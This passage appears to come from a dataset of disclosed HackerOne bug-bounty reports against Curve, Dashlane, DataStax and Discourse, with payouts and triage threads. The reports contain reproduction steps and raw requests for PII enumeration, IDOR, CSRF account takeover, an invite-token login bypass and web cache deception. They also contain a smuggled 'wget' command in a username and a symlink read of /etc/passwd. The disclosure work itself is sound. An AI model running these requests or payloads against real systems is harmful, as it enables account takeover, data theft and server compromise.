5] Now send the above vulnerable request to Burp intruder and brute force the email parameter
6] You'll now be able to retrieve all the waitlisted users mobile numbers, ID's, address and other sensitive information in the response.
Response:
Code 1.68 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Content-Type: application/json; charset=utf-8
3Content-Length: 268
4Connection: close
5access-control-allow-origin: *
6x-dns-prefetch-control: off
7x-frame-options: SAMEORIGIN
8strict-transport-security: max-age=15552000; includeSubDomains
9x-download-options: noopen
10x-content-type-options: nosniff
11x-xss-protection: 1; mode=block
12etag: W/""10c-Qj52/PIteKYG+1CbKaOCNpKyiDo""
13date: Fri, 19 Jun 2020 09:41:26 GMT
14x-envoy-upstream-service-time: 3
15x-envoy-peer-metadata: Ch4KDElOU1RBTkNFX0lQUxIOGgwxMC4wLjE1Mi4yMDEK0AEKBkxBQkVMUxLFASrCAQoUCgNhcHASDRoLd2Vic2l0ZS1hcGkKIQoRcG9kLXRlbXBsYXRlLWhhc2gSDBoKN2Q5NzRmNTQ3NQokChlzZWN1cml0eS5pc3Rpby5pby90bHNNb2RlEgcaBWlzdGlvCjAKH3NlcnZpY2UuaXN0aW8uaW8vY2Fub25pY2FsLW5hbWUSDRoLd2Vic2l0ZS1hcGkKLwojc2VydmljZS5pc3Rpby5pby9jYW5vbmljYWwtcmV2aXNpb24SCBoGbGF0ZXN0ChoKB01FU0hfSUQSDxoNY2x1c3Rlci5sb2NhbAomCgROQU1FEh4aHHdlYnNpdGUtYXBpLTdkOTc0ZjU0NzUtZHRuZzgKGQoJTkFNRVNQQUNFEgwaCnByb2R1Y3Rpb24KUgoFT1dORVISSRpHa3ViZXJuZXRlczovL2FwaXMvYXBwcy92MS9uYW1lc3BhY2VzL3Byb2R1Y3Rpb24vZGVwbG95bWVudHMvd2Vic2l0ZS1hcGkKHwoPU0VSVklDRV9BQ0NPVU5UEgwaCnZhdWx0LWF1dGgKHgoNV09SS0xPQURfTkFNRRINGgt3ZWJzaXRlLWFwaQ==
16x-envoy-peer-metadata-id: sidecar~10.0.152.201~website-api-7d974f5475-dtng8.production~production.svc.cluster.local
17server: envoy
18X-Cache: Miss from cloudfront
19Via: 1.1 1671dd64160321b1f8979341944a5b14.cloudfront.net (CloudFront)
20X-Amz-Cf-Pop: MAA50-C2
21X-Amz-Cf-Id: kUgxzRYYQ9rJw0zP7oR4PnDz6Rz4bCc6r30M25JrfmOyzp_xuMEHyA==
22
23{""_id"":""5eec6b1a958666b5141063e3"",""name"":""Cxvvc"",""email"":""praseudo@gmail.com"",""phoneNumber"":""7013899887"",""zipcode"":""10001"",""position"":4379,""referralCode"":""BCeE8mzI"",""createdAt"":""2020-06-19T07:36:58.460Z"",""updatedAt"":""2020-06-19T07:36:58.460Z"",""__v"":0,""status"":""EXIST""}
Below is the video POC for better understanding:
Video F874205: Curve_Sens_Info.mov 30.73 MiBZoom in Zoom out Copy Download
Impact
An attacker can retrieve all the joined users PII data (like mobile numbers, address, ID's, etc) by just entering the mail address at ""Track my position"" at https://curve.com/usa.
Mitigation:
Make sure to remove sensitive response parameters which discloses users PII data.
Regards,
Praseudo4 attachments:F874173: Image_2020-06-19_at_2.57.13_PM.pngF874174: Image_2020-06-19_at_2.59.13_PM.pngF874175: Image_2020-06-19_at_3.23.36_PM.pngF874205: Curve_Sens_Info.mov0xcain   posted a comment. Jun 19th (2 years ago)Hi @praseudo7,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@0xcain0xcain   changed the status to Triaged. Jun 19th (2 years ago)Hello @praseudo7,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@0xcain
    
    
        
            
                
                
                
            
        
    
praseudo7   posted a comment. Jun 22nd (2 years ago)Hi @0xcain ,
Is there any update on this vulnerability yet ?
Regards,
Praseudo
    
    
        
            
                
                
                
            
        
    
praseudo7   posted a comment. Jun 25th (2 years ago)Hey @0xcain  @Curve
May I know is there any progress on fixing of this issue ? 
Regards,
Praseudo
    
    
        
            
                
                
                
            
        
    
praseudo7   posted a comment. Jun 30th (2 years ago)Hi @0xcain ,
Can someone give any update on this vulnerability ? It's been more than 2 weeks that the vulnerability is still out there. This could be a GDPR issue as the ""Curve"" app is from UK country and this lead to huge reputation and revenue loss to the company. It would be better if this vulnerability gets fixed as soon as possible.
Hoping for quick reply from @Curve @0xcain  @hackerone
Regards,
Praseudo0xcain   posted a comment. Jul 1st (2 years ago)Hello  @praseudo7,
Thanks for your patience! The Curve team is still working on this internally, and you will be updated once there is more information to share.
Regards,
@0xcainCurve  rewarded praseudo7 with a $1,500 bounty. Jul 9th (2 years ago)beveradb   closed the report and changed the status to Resolved. Sep 11th (2 years ago)praseudo7   requested to disclose this report. Sep 23rd (2 years ago)  This report has been disclosed. Oct 23rd (2 years ago)",https://hackerone.com/reports/902733,New York,United States,New York,2020,6,19,10,20
Dashlane,251-500,0.0,1m-10m,$300.00,No value,0.0,Business Logic Errors,Extract Billing admin email address using random team id,"csanuragjain  submitted a report to Dashlane.May 3rd (6 years ago)Any user can extract and enumerate email address of dashlane members.
Steps to reproduce
1) Login to console.dashlane.com (Register using https://www.dashlane.com/business/try)
2) Click on Manage Users while intercepting request in Burp
3) Look for a request to https://ws1.dashlane.com/1/teamPlans/getTeamLastUpdateTs
4) Note down the body param values for login and uki
5) Send the request from Step3 to Burp Repeater
6) Change the request uri to https://ws1.dashlane.com/1/teamPlans/members in repeater. Also change body param to below:
limit=0&login=<login from Step4>&orderBy=login&teamId=<Team for which you want billing admin email>&uki=<uki from Step4>
7) Forward the request
8) Notice the response. The value of billingAdmins contains the billing address of the team given in Step6
9) Repeat Step6 with different team id to extract all admin emails
Mitigation
Do not include email information for unauthorized team id.1 attachment:F181574: mailaddress.PNG",https://hackerone.com/reports/225831,New York,United States,New York,2017,5,3,13,41
Dashlane,251-500,0.0,1m-10m,$100.00,No value,0.0,None,[https://www.dashlane.com] Test Panel Disclosure,"rbcafe  submitted a report to Dashlane.May 11th (6 years ago)Greetings,
On https://www.dashlane.com/ , I observed that the server discloses test panel at :
https://www.dashlane.com/app/tests/
Image F183690: test.png 26.68 KiBZoom in Zoom out Copy Download
I found no relation between an account and the following page to do unauthorized tests.
The following tests are available with no credential :

https://www.dashlane.com/app/tests/encrypt.html
https://www.dashlane.com/app/tests/decrypt.html
https://www.dashlane.com/app/tests/deflate.html
https://www.dashlane.com/app/tests/inflate.html
https://www.dashlane.com/app/tests/unittest.html

For example it was possible to extract a salt or obtain various information :
        Debug Start encodingReceived (length: 1)1Start compressingDeflating raw input: (length: 1)49:Hex: (length: 2)31Input Base64: (length: 4)MQDeflating with level 7Deflated value: (length: 3)3After deflating Base64: (length: 20)AAAAAXjaMwQAADIAMgDone compressingIn byte array: (length: 13)0:0:0:1:120:218:51:4:0:0:50:0:50:Actual data: (length: 13)0:0:0:1:120:218:51:4:0:0:50:0:50:Preparing 5 salts.Start calculating PBKDF2Feeding PBKDF2 with:- salt: '»iõòC6g¤w-Ö~Edcn\ }¶p8ûÑþ¡ò'- pass: '1'- iterations: 10204Done calculating BPKDF2, took 0.311 secondsPBKDF2: (length: 32)106:76:228:43:126:148:140:72:64:151:168:117:46:244:164:247:206:202:249:160:71:224:76:248:229:115:221:172:179:104:30:49:Calculating Bytes To Key:- iterations: 1- salt: bb69f512f2433667a4772dd67e4564636e5c5c8a201b7db67038fbd1fea19cf2Final key: (length: 32)106:76:228:43:126:148:140:72:64:151:168:117:46:244:164:247:206:202:249:160:71:224:76:248:229:115:221:172:179:104:30:49:Initial vector: (length: 16)173:220:214:98:209:30:141:67:138:196:13:63:4:202:26:199:Encrypting (length: 13)0:0:0:1:120:218:51:4:0:0:50:0:50:Encrypted data: (length: 16)Ç£IS¤<ÁT(ËwñEncoded & with salt: (length: 72)u2n1EvJDNmekdy3WfkVkY25cXIogG322cDj70f6hnPJLV0Mzx1...... And we are done here.
I produced a video :
Video F183691: aes.mov 13.32 MiBZoom in Zoom out Copy Download
Fix :
The panel should be protected with 403 or 401
Best regards
@Rbcafe2 attachments:F183690: test.pngF183691: aes.movcyril_l Dashlane staff  posted a comment. Updated May 11th (6 years ago)Hello, 
Thanks for this report. 

the salt is not a static value
the pages are only static html so everyone can run javascript encrypt/decrypt tests :)
there is no secret in it .

We will however remove the page.
Regards,
CyrilDashlane  rewarded rbcafe with a $100 bounty. May 11th (6 years ago)cyril_l Dashlane staff  changed the status to Triaged. May 11th (6 years ago)rbcafe   posted a comment. May 11th (6 years ago)Greetings,
Thanks for the information and for the bounty.
Best regards
@Rbcafecyril_l Dashlane staff  closed the report and changed the status to Resolved. Jun 21st (5 years ago)We've removed the pages. Thanks for this report!rbcafe   posted a comment. Jun 21st (5 years ago)Greetings,
Thanks for the information.
Do you agree for disclosure ?
Best regardsrbcafe   requested to disclose this report. Jun 21st (5 years ago)cyril_l Dashlane staff  posted a comment. Updated Jun 23rd (5 years ago)It's not a vulnerability, what is the point of disclosing ?rbcafe   posted a comment. Jun 23rd (5 years ago)Greetings,
It always an interesting point to disclose information. It brings some transparency.
Best regards
@rbcafe cyril_l Dashlane staff  posted a comment. Updated Jul 21st (5 years ago)███████ rbcafe   posted a comment. Updated Jun 23rd (5 years ago)Greetings,
There is no absence of logic. It discloses the information in a particular way : ""How Dashlane used to do test on this panel"". It's very interesting to discover such information, because on my side, I learned from this. (video and photo)
Regarding the ""Next time"", an update of the scope would be feasible.
Best regards
@rbcafe cyril_l Dashlane staff  updated the severity to none. Jun 23rd (5 years ago)  This report has been disclosed. Jul 21st (5 years ago)",https://hackerone.com/reports/227663,New York,United States,New York,2017,5,11,9,30
Dashlane,251-500,0.0,1m-10m,$350.00,Medium,5.3,Improper Restriction of Authentication Attempts,Throttling Bypass - ws1.dashlane.com,"corb3nik  submitted a report to Dashlane.May 3rd (6 years ago)Description
The host at ws1.dashlane.com throttles requests based on the IP address of the user after a certain amount of repeated requests.
By adding the X-Forwarded-For header, an attacker can bypass the throttling completely, rendering the security measure ineffective against DOS attacks. 
Proof of concept

Send a large amount of requests like the following until a {""error"":{""code"":-32600,""message"":""Throttled.""}} message is received.
Send another request with an added X-Forwarded-For header : 
The web server will respond with a successful message instead of a throttled response.

I have attached two screenshots demonstrating the proof of concept.
Thank you,
Ian2 attachments:F181648: throttled.pngF181649: bypassed.pngcyril_l Dashlane staff  changed the status to Triaged. May 4th (6 years ago)Hello,
We've reproduced the issue and we'll fix it soon,.
Thanks a lot for the report. Dashlane  rewarded corb3nik with a $350 bounty. May 10th (6 years ago)cyril_l Dashlane staff  closed the report and changed the status to Resolved. May 10th (6 years ago)It's fixed thanks a lot for this report.corb3nik   requested to disclose this report. Jun 30th (5 years ago)  This report has been disclosed. Jul 30th (5 years ago)",https://hackerone.com/reports/225897,New York,United States,New York,2017,5,3,18,9
Dashlane,251-500,0.0,1m-10m,$100.00,No value,0.0,Improper Authentication - Generic,Missing Access Control(IDOR) To Know LinkedAccounts ,"kiraak-boy  submitted a report to Dashlane.Jul 20th (6 years ago)Hello Team,
While Digging your Application I Came to Endpoint Where I Was Able to Check Whether Email is been Used in Multiple Account's or not , And Also Email's Are Getting Leaked .
You have Feature to Enter Email To get Token :
Image F105969: idor.PNG 24.79 KiBZoom in Zoom out Copy Download 
As you can see from the above Screenshot , I'm Logged in as (arbaz.owasp@gmail.com) and i put the Email (pentester.owasp@gmail.com) For Getting Code's Which Means I Have Linked my Account into Another Account.

Your Endpoint Request :
POST /1/account/getLinkedAccounts HTTP/1.1
Host: www.dashlane.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.dashlane.com/business/try
Content-Length: 31
Cookie:
Connection: close
email=pentester.owasp@gmail.com

Response :
{""code"":200,""message"":""OK"",""content"":{""logins"":[""pentester.owasp@gmail.com"",""arbaz.owasp@gmail.com"",""hacker.arbaz@gmail.com""]}}

From the Above Response You Can See into Which Which Accounts , Email Have been Linked.  
Image F105970: idor1.png 56.73 KiBZoom in Zoom out Copy Download
Thanks!
Best,
Arbaz2 attachments:F105969: idor.PNGF105970: idor1.pngcyril_l Dashlane staff  changed the status to Triaged. Jul 23rd (6 years ago)nice one. Thanks for the report, we will fix that soon.kiraak-boy   posted a comment. Jul 23rd (6 years ago):D Yea Was Tricky to Find ! :)cyril_l Dashlane staff  posted a comment. Jul 23rd (6 years ago)It's a new feature.kiraak-boy   posted a comment. Jul 23rd (6 years ago)Hey @cyril_l  Where i can more Find about New Features ? :D Would Love to Test .cyril_l Dashlane staff  posted a comment. Jul 23rd (6 years ago)we usually communicate broadly when it's ready. And I send a message here when we want new features to be tested :)kiraak-boy   posted a comment. Jul 23rd (6 years ago)Okay :) .Dashlane  rewarded kiraak-boy with a $100 bounty. Oct 1st (6 years ago)cyril_l Dashlane staff  closed the report and changed the status to Resolved. Oct 1st (6 years ago)Thanks for this one !kiraak-boy   requested to disclose this report. May 27th (5 years ago)  This report has been disclosed. Jun 26th (5 years ago)",https://hackerone.com/reports/152407,New York,United States,New York,2016,7,20,3,39
DataStax,501-1000,0.0,50m-100m,"$1,000.00",High,8.3,Reliance on Untrusted Inputs in a Security Decision,Helpdesk Takeover at dmc.datastax.com,"matrixsoftsec  submitted a report to DataStax.Dec 16th (3 years ago)Summary:
DNS record dmc.datastax.com is pointing to stale dmc-support.zendesk.com domain on Zendesk which is available for takeover.
DNS Stale Records: Image F661014: Screenshot_from_2019-12-16_20-31-10.png 202.85 KiBZoom in Zoom out Copy Download
Proof of Concept:
There was no helpdesk configured at this address, which means that the address was available and anyone could claim it. I was able to claim dmc-support.zendesk.com.
On this page, https://dmc.datastax.com/hc/en-us I haven't made the page public, I'm attaching a screenshot of the webpage:
Image F661004: Screenshot_from_2019-12-16_20-20-40.png 166.41 KiBZoom in Zoom out Copy Download 
Supporting Material/References:
Login page:
Image F661021: Screenshot_from_2019-12-16_20-39-40.png 78.45 KiBZoom in Zoom out Copy Download
Impact
Subdomain takeover3 attachments:F661004: Screenshot_from_2019-12-16_20-20-40.pngF661014: Screenshot_from_2019-12-16_20-31-10.pngF661021: Screenshot_from_2019-12-16_20-39-40.pngbcoverston   updated the severity from high to none. Dec 16th (3 years ago)bcoverston   updated the severity from none to high (8.3). Dec 16th (3 years ago)DataStax  rewarded matrixsoftsec with a $1,000 bounty. Dec 16th (3 years ago)@priyanshuxo ,
Thanks for your report, we've removed the entries in the DNS record pointing to ZenDesk.
@bcoverston bcoverston   closed the report and changed the status to Resolved. Dec 16th (3 years ago)matrixsoftsec   requested to disclose this report. Dec 16th (3 years ago)Thank you so much for the bounty!
Public disclosure?
This is my first resolved report, so I wanted to share it.  This report has been disclosed. Jan 15th (3 years ago)",https://hackerone.com/reports/759454,California,United States,Santa Clara,2019,12,16,15,26
Discourse,11-50,0.0,10m-50m,$512.00,High,7.95,Cross-Site Request Forgery (CSRF),Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account,"avinash_  submitted a report to Discourse.Oct 12th (4 years ago)Hi
There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.
I noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.
Vulnerable Request:
GET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Steps to reproduce:

Attacker go to https://try.discourse.org/u/user/preferences/account
Switch on burp interceptor and click on Yahoo connect.
Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.
Copy that and drop the request( here you saved the auth token generated by yahoo).
Now feed the copied request to authenticated victim (as a html form or as an url).
Victim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.
Attacker open his browser and try to login with yahoo.
Attacker get redirected to https://try.discourse.org/auth/yahoo/null
Attacker open https://try.discourse.org
Check Victim's account successfully compromised.

Impact
Account Takeover.",https://hackerone.com/reports/423022,Delaware,United States,Dover,2018,10,12,16,57
Discourse,11-50,0.0,10m-50m,$512.00,High,7.95,Command Injection - Generic,Admin Command Injection via username in user_archive ExportCsvFile,"ziot  submitted a report to Discourse.Mar 16th (6 years ago)When a user generates a backup of their posts, their username gets sent to the ExportCsvFile job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.
Steps

Login as an admin on try.discourse.org, e.g.


http://try.discourse.org/


Make a backup of the website and download it.
Extract the contents of the archive.
Modify one of the usernames of an account you have access to:


test.txt;wget mrzioto.com


Repackage the archive.
Upload the modified archive.
Restore from backup.
Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).
Send the POST request for creating a user export archive:


http://34.205.246.2/export_csv/export_entity.json
POST: entity_type=user&entity=user_archive


---> You forced the server to make a wget leading to RCE/command injection.

Code Flow
Code 315 BytesWrap lines Copy Download1      file_name_prefix = if @entity == ""user_archive""
2        ""#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime(""%y%m%d-%H%M%S"")}""
3
4      file_name = ""#{file_name_prefix}-#{file.id}.csv""
5      absolute_path = ""#{UserExport.base_directory}/#{file_name}""
6
7      `gzip -5 #{absolute_path}`",https://hackerone.com/reports/214022,Delaware,United States,Dover,2017,3,16,22,5
Discourse,11-50,0.0,10m-50m,$256.00,Medium,5.0,Privacy Violation,"Any authenticated user can download full list of users, including email","arkadiyt  submitted a report to Discourse.May 15th (6 years ago)The ExportCsvController allows users to export different types of entities, if one has guardian access:
https://github.com/discourse/discourse/blob/master/app/controllers/export_csv_controller.rb#L6
However, the guardian check only checks that the entity type is not ""admin"":
https://github.com/discourse/discourse/blob/master/lib/guardian.rb#L296
But the entity type ""admin"" does not exist anyway, so the check boils down to whether or not a user has made an export on that day. This means that once a day a user can export any of the entity types in the ExportCsvFile job:
https://github.com/discourse/discourse/blob/master/app/jobs/regular/export_csv_file.rb
Including:
A full user list export (names, email addresses, admin status, etc)
Staff actions
etc
As a proof of concept I was able to download a full list of users on https://try.discourse.org2 attachments:F184591: Screen_Shot_2017-05-14_at_6.04.04_PM.pngF184592: Screen_Shot_2017-05-14_at_6.06.00_PM.png",https://hackerone.com/reports/228399,Delaware,United States,Dover,2017,5,15,1,8
Discourse,11-50,0.0,10m-50m,"$1,024.00",Critical,9.5,None,Any user with invite capabilities can take-over any account on Discourse,"mishre  submitted a report to Discourse.Jun 23rd (5 years ago)Description
Users with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml)  can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.
Steps to reproduce
1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).
2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:
Code 695 BytesWrap lines Copy Download1POST http://localhost:4000/invites/link HTTP/1.1
2Host: localhost:4000
3Connection: keep-alive
4Content-Length: 35
5Origin: http://localhost:4000
6X-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==
7Discourse-Visible: true
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
9Content-Type: application/x-www-form-urlencoded; charset=UTF-8
10Accept: */*
11X-Requested-With: XMLHttpRequest
12Referer: http://localhost:4000/
13Accept-Encoding: gzip, deflate, sdch, br
14Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2
15Cookie: {redacted}
16
17email=testingmichaelreiz@gmail.coma
you""ll receive the following response:
Code 1.18 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2X-Frame-Options: SAMEORIGIN
3X-XSS-Protection: 1; mode=block
4X-Content-Type-Options: nosniff
5X-Discourse-Username: {some-user}
6X-Discourse-Route: invites/create_invite_link
7Cache-Control: no-store, must-revalidate, private, max-age=0
8Content-Type: application/json; charset=utf-8
9Set-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax
10Set-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax
11Set-Cookie: __profilin=p%3Dt; path=/
12X-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc
13X-Runtime: 1.912866
14X-MiniProfiler-Ids: [""jfv6h7gfji19eekx7p57"",""nsqp68md79y8tusrn8rn"",""4s5fo1o25vp9l7954ybm"",""blf2ua82vyc0n9683jwb"",""fe5d5qfugyl5u0hjp7ez"",""3s7hzl7imehtnono8p18"",""dmmjnggyftilvg882j9q"",""bwvs5enxy6pqockcxael"",""tfu1fnjp7hi5e0nxhqwf""]
15Content-Length: 64
16
17""http://localhost:3000/invites/{some-token}""
Now copy the token for a use in the later steps - don't click the link.
3) Now open a new incognito tab and launch the following url:
Code 83 BytesWrap lines Copy Download1http://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com
You should now be logged in to the victim's account.
Resolution
You should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:
Code 253 BytesWrap lines Copy Download1    invite = Invite.find_by(invite_key: params[:token])
2
3    if invite.present?
4      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)
5      if user.present?
6        log_on_user(user)
Impact
Any user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.",https://hackerone.com/reports/242765,Delaware,United States,Dover,2017,6,23,21,39
Discourse,11-50,0.0,10m-50m,$512.00,High,7.95,Information Disclosure,Arbitrary Local-File Read from Admin - Restore From Backup due to Symlinks,"ziot  submitted a report to Discourse.Mar 15th (6 years ago)As an Admin user on Discourse there is a feature to create, upload, and restore backups. Generating a backup creates a tar file consisting of the database as a SQL file and uploaded files from /public/upload/*. Having the ability to upload these tar files and restore from them, you can add any file that you wish. 
Manually modifying the tar archive and adding a symlink, you are able to read any arbitrary file that the user has permission to including files outside of the Discourse application directory.
Steps

Load http://try.discourse.org
Login as an Admin user.
Go to the Backups page:


http://try.discourse.org/admin/backups/


Create a new backup including files.
Extract the backup files to a folder on your server.
Create a symlink to /etc/passwd In the /uploads/ folder of the backup, e.g. /uploads/default/original/1X/[file].jpg.


example: ln -s /etc/passwd /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png


Create a .tar.gz from the extracted files.
Upload the newly crafted tar to the server.
Enable Restore from Backups in settings if it's not enabled.
Restore from the backup that uploaded.
Go to the uploaded file in your browser after it uploads, e.g.


http://try.discourse.org/uploads/default/original/1X/[file].jpg


---> You were able to read file contents of /etc/passwd due to the symlink being extracted from the tar.
1 attachment:F168956: symlink.png",https://hackerone.com/reports/213558,Delaware,United States,Dover,2017,3,15,2,26
Discourse,11-50,0.0,10m-50m,$256.00,Low,2.0,Cross-Site Request Forgery (CSRF),"CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)","fransrosen  submitted a report to Discourse.Aug 16th (5 years ago)Hi,
I noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting try.discourse.org but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.
The TL;DR of issue is basically: Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens.
As you might understand due to this, the PoC below is not working on try.discourse.org. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.
Background
You might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. 
Any URL having a file ending with one of CloudFlare's mime types will be cached for the whole region. Remember, a region is big and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from CloudFlare about their regions.
This attack vector was coined by Omer Gil earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).
Technical details
The issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status 200 but also to status 404.
Here are some routes which will return status 200 on try.discourse.org even if we have appended .css on them (which is a trigger for CloudFlare to cache this URL):
Code 85 BytesWrap lines Copy Download1/u/my/preferences.css
2/u/my/preferences/username.css
3/u/my/preferences/card-badge.css
Results in:
Code 159 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2X-Discourse-Route: users/preferences
3
4HTTP/1.1 200 OK
5X-Discourse-Route: users/preferences
6
7HTTP/1.1 200 OK
8X-Discourse-Route: users/card_badge
(This seems to be a general issue with the X-Discourse-Route: users/* routes)
Also, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):
Code 119 BytesWrap lines Copy Download1GET /u/x.css HTTP/1.1
2Host: try.discourse.org
3
4<meta name=""csrf-token"" content=""aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg=="" />
You currently don't have try.discourse.org behind CloudFlare, but I've verified with a few instances that I noticed did.
What you will see is the following:
Issuing the following request twice while being signed in:
Code 21 BytesWrap lines Copy Download1GET /u/x.css HTTP/1.1
Will lead to:
Code 20 BytesWrap lines Copy Download1CF-Cache-Status: HIT
As well as:
Code 77 BytesWrap lines Copy Download1X-Discourse-Username: test
2
3<meta name=""csrf-token"" content=""6bE...VnlQ=="" />
Same thing with /u/my/preferences.css.
The issue is that none of these routes, exposing the CSRF-token and the username, has any Pragma, Cache-Control or Expire-headers, so there's nothing that tells CloudFlare not to cache these URLs.
PoC
You need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:
Image F213373: Screen_Shot_2017-08-16_at_14.07.00.png 14.08 KiBZoom in Zoom out Copy Download
Now, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.
What this script will do is this:

Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy
Victim vists a malicious page by the attacker
The page will issue three requests using img-tags to /u/$rand.css, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token
After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).
The script will extract the username from the X-Discourse-Username header and the CSRF-token from the HTML
The PHP-script will return these two values to the malicious site, and a form will be crafted:

Code 120 BytesWrap lines Copy Download1POST /users/$username/preferences/email.json HTTP/1.1
2 
3_method=PUT&email=$attacker_email&authenticity_token=$csrf_token

Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.

Here's the script. It seems like _forum_session-token has SameSite=lax which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.
